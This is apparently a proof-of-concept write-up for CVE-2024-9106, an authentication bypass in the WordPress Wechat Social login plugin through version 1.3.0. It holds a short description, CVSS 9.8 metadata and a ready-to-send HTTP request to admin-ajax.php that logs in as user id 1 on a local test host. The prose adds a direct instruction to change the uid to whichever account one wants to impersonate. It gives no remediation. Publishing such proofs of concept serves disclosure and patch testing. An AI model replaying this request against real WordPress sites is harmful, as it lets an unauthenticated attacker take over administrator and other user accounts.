# CVE-2024-9106
Wechat Social login &lt;= 1.3.0 - Authentication Bypass

# Description:
The Wechat Social login plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 1.3.0. This is due to insufficient verification on the user being supplied during the social login. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the user id. This is only exploitable if the app secret is not set, so it has a default empty value. Just add uid=1 or change the id number to the account you want to login in as. Only works for wechat.


```
CVE: CVE-2024-9106
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 9.8
Slugs: wechat-social-login
```


POC
---

```
GET /wp-admin/admin-ajax.php?channel_id=social_weibo&action=xh_social_channel&uid=1&tab=login_redirect_to_authorization_uri&xh_social_channel=8e7bec203c&notice_str=1773207877&hash=4165e284f73b86c0c642973816d0cd17&redirect_to=http%3A%2F%2Fkubernetes.docker.internal%2Fwp-admin%2F HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```
